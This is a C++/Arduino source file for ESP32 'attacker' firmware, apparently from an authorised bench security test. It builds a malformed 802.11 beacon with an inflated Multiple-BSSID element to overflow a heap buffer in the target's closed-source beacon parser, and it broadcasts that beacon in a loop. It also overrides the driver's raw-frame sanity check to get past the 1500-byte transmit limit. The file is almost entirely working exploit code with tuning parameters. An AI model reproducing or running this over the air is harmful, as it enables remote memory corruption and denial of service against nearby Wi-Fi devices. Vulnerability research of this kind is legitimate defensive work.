// mbssid_attacker — HITL security-test ATTACKER firmware (finding 001).
//
// Authorized security testing (isolated HITL bench, own hardware). Builds an
// 802.11 beacon carrying a Multiple-BSSID (MBSSID, element ID 0x47) element and
// injects it repeatedly with esp_wifi_80211_tx(). The paired "target" DUT, while
// scanning, parses it in ieee80211_parse_mbssid() (closed libnet80211) — the
// function audited in
// esp32-reverse/docs/audit/findings/001-mbssid-reconstruction.md, which
// reconstructs a full standalone beacon per nontransmitted BSSID into a fixed
// ~1.6 KB esf_buf with no destination-bounds check on the IE-append loop.
//
// Strategy to overflow the reconstruction buffer: make the *transmitted* beacon
// carry a large set of IEs (padded with vendor-specific 0xDD elements) AND an
// MBSSID element whose nontransmitted profile adds further IEs — so the
// reconstructed frame (transmitted IEs + profile IEs) exceeds the pool buffer.
//
// Two build-time modes (LM_ATTACK):
//   0 = benign   — a spec-valid, small MBSSID beacon (baseline; target heap_ok=1)
//   1 = malicious — inflated to overflow the reconstruction (target should trip
//                   heap_caps_check_integrity_all / panic)
//
// The exact overflow threshold depends on the pool capacity and reconstruction
// math; TX_PAD_TARGET / profile sizing below are the knobs to iterate on the
// bench (watch the target's `mbssid-target:` serial + JTAG).

#include <string.h>

#include <WiFi.h>

#include "esp_wifi.h"

#ifndef LM_ATTACK
#define LM_ATTACK 1
#endif

// --- Sender-side patch: lift the 1500 B esp_wifi_80211_tx limit --------------
// esp_wifi_80211_tx() (libnet80211) rejects len>1500 via the internal
// ieee80211_raw_frame_sanity_check() (`0x5dc < len`). We provide our OWN strong
// definition returning 0 (OK): the blob's internal call resolves to this symbol
// at link time (it lives in a separate object), bypassing ALL raw-TX checks so
// we can inject a >1500 B beacon to reach the target's 1700 B RX buffer (the
// overflow threshold for finding 001 is a ~1623 B beacon). NOTE: the TX path
// still copies into a type-1 esf_buf (~1600 B), so this reaches ~1600 B — right
// at the boundary; a fully unbounded injector (RTL8851BU/monitor card) is the
// surer path. Build with --copt=-DLM_PATCH_TXLIMIT=1.
#if LM_PATCH_TXLIMIT
extern "C" int ieee80211_raw_frame_sanity_check(unsigned ifx, unsigned char *frame,
                                                unsigned len, int en_sys_seq) {
  (void)ifx; (void)frame; (void)len; (void)en_sys_seq;
  return 0;  // accept any length/type
}
#endif

static const uint8_t kChannel = 6;
// Attacker's transmitter/BSSID address (locally-administered, not a real vendor).
static const uint8_t kBssid[6] = {0x02, 0x00, 0x53, 0x45, 0x43, 0x01};

// esp_wifi_80211_tx caps the frame at 1500 bytes (esp_wifi.h). The whole beacon
// (24 hdr + 12 fixed + IEs incl. MBSSID element) must stay <= 1500, so we push
// the *transmitted* IE set as large as possible under that cap: those IEs get
// re-appended by the reconstruction (from esf_buf+0x80), and overflow needs the
// reconstruction > pool capacity. Tunable on-bench (watch attacker tx ret=0 and
// target free-heap/heap_ok).
#if LM_ATTACK
#if LM_PATCH_TXLIMIT
static const size_t kTxPadTarget = 1560;  // patched: push toward the ~1600B tx-ebuf ceiling
static const size_t kMaxFrame = 1600;
#else
static const size_t kTxPadTarget = 1305;  // -> frame ~1490B (< 1500 cap; 1330 gave 1511)
static const size_t kMaxFrame = 1500;     // esp_wifi_80211_tx hard limit
#endif
static const size_t kProfileExtra = 96;
#else
static const size_t kTxPadTarget = 64;
static const size_t kProfileExtra = 16;
static const size_t kMaxFrame = 1500;
#endif

static uint8_t g_frame[2048];
static size_t g_len;

static inline void put(uint8_t b) { g_frame[g_len++] = b; }
static inline void put_bytes(const void *p, size_t n) {
  memcpy(&g_frame[g_len], p, n);
  g_len += n;
}
// Append a tagged IE: [id][len][data...]
static void put_ie(uint8_t id, const uint8_t *data, uint8_t len) {
  put(id);
  put(len);
  if (len) put_bytes(data, len);
}
// Append vendor-specific (0xDD) padding IEs until we've added ~want bytes total.
static void pad_vendor_ies(size_t want) {
  static uint8_t buf[255];
  memset(buf, 0x5a, sizeof(buf));
  size_t added = 0;
  while (added < want) {
    uint8_t body = 253;  // max IE payload we bother with (2 hdr + 253 = 255)
    size_t remaining = want - added;
    if (remaining < (size_t)(body + 2)) body = (remaining > 2) ? remaining - 2 : 1;
    put_ie(0xDD, buf, body);
    added += (size_t)body + 2;
  }
}

static void build_beacon() {
  g_len = 0;
  // --- 802.11 MAC header (24B): beacon = type mgmt(0), subtype 8 -> FC 0x0080 --
  put(0x80); put(0x00);                       // Frame Control
  put(0x00); put(0x00);                       // Duration
  for (int i = 0; i < 6; i++) put(0xFF);      // DA = broadcast
  put_bytes(kBssid, 6);                        // SA
  put_bytes(kBssid, 6);                        // BSSID
  put(0x00); put(0x00);                       // Seq/Frag control
  // --- fixed beacon params (12B) ---
  for (int i = 0; i < 8; i++) put(0x00);      // Timestamp
  put(0x64); put(0x00);                       // Beacon interval (100 TU)
  put(0x21); put(0x04);                       // Capability info
  // --- tagged params (IEs) ---
  const uint8_t ssid[] = {'S','E','C','-','M','B','S','S','I','D'};
  put_ie(0x00, ssid, sizeof(ssid));           // SSID
  const uint8_t rates[] = {0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
  put_ie(0x01, rates, sizeof(rates));         // Supported rates
  put_ie(0x03, &kChannel, 1);                 // DS Params (channel)
  const uint8_t tim[] = {0x00, 0x01, 0x00, 0x00};  // TIM: DTIM cnt/period/ctrl/bitmap
  put_ie(0x05, tim, sizeof(tim));             // TIM (real beacons carry it)

  // Inflate the transmitted IE set so the reconstruction (which re-appends all
  // of these) approaches/exceeds the pool buffer.
  pad_vendor_ies(kTxPadTarget);

  // --- Multiple BSSID element (ID 0x47) -----------------------------------
  // [0x47][len][MaxBSSIDIndicator][Subelement 0 = Nontransmitted BSSID Profile]
  // The nontransmitted profile begins with a Multiple BSSID-Index element
  // (ID 0x53, len 2) — matching the parser's inner check — then an SSID and
  // extra IEs whose merge grows the reconstructed frame.
  size_t mbssid_len_pos;
  put(0x47);                                  // element ID = MBSSID
  mbssid_len_pos = g_len;                     // backpatch len
  put(0x00);                                  // (len placeholder)
  size_t mbssid_body_start = g_len;
  put(0x02);                                  // MaxBSSID Indicator (n=2 -> 4 BSSIDs)

  // Subelement 0: Nontransmitted BSSID Profile
  put(0x00);                                  // subelement ID = 0
  size_t sub_len_pos = g_len;
  put(0x00);                                  // (sublen placeholder)
  size_t sub_body_start = g_len;
  // Multiple BSSID-Index element (ID 0x53, len 2): [index][dtim?]
  const uint8_t mbi[] = {0x01, 0x00};
  put_ie(0x53, mbi, sizeof(mbi));             // -> parser sees 0x53,0x02
  const uint8_t nssid[] = {'n','t','x'};
  put_ie(0x00, nssid, sizeof(nssid));         // Nontransmitted SSID
  const uint8_t caps[] = {0x21, 0x04};
  put_ie(0x02, caps, sizeof(caps));           // (Nontransmitted) capabilities-ish
  // Extra profile IEs to grow the reconstructed frame past the pool buffer.
  pad_vendor_ies(kProfileExtra);
  // Backpatch subelement length.
  g_frame[sub_len_pos] = (uint8_t)(g_len - sub_body_start);
  // Backpatch MBSSID element length (note: >255 total is impossible in one IE;
  // the transmitted padding lives OUTSIDE the MBSSID element, so this stays valid).
  g_frame[mbssid_len_pos] = (uint8_t)(g_len - mbssid_body_start);
}

void setup() {
  Serial.begin(115200);
  delay(200);
  Serial.println("mbssid-attacker: boot");
  WiFi.persistent(false);
  // Run a REAL SoftAP (SEC-AP-REACH) so a genuine beacon is broadcast — the
  // target seeing it proves RF reachability between the two bench DUTs. We also
  // inject the crafted MBSSID beacon from the AP interface.
  WiFi.mode(WIFI_AP);
  WiFi.softAP("SEC-AP-REACH", nullptr, kChannel);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_channel(kChannel, WIFI_SECOND_CHAN_NONE);
  build_beacon();
  if (g_len > kMaxFrame) {
    Serial.printf("mbssid-attacker: WARNING frame_len=%u > %u cap; esp_wifi_80211_tx will reject\n",
                  (unsigned)g_len, (unsigned)kMaxFrame);
  }
  Serial.printf("mbssid-attacker: mode=%d channel=%u frame_len=%u ssid=SEC-MBSSID (tx via 80211_tx)\n",
                LM_ATTACK, kChannel, (unsigned)g_len);
}

void loop() {
  static uint32_t n = 0;
  // Re-assert the channel periodically (the STA can drift), and let the system
  // manage sequence numbers (en_sys_seq=true).
  if ((n % 50) == 0) esp_wifi_set_channel(kChannel, WIFI_SECOND_CHAN_NONE);
  esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, g_frame, (int)g_len, true);
  if ((n++ % 100) == 0) {
    Serial.printf("mbssid-attacker: tx #%lu ret=%d (0=OK)\n", (unsigned long)n, (int)e);
  }
  delay(20);
}
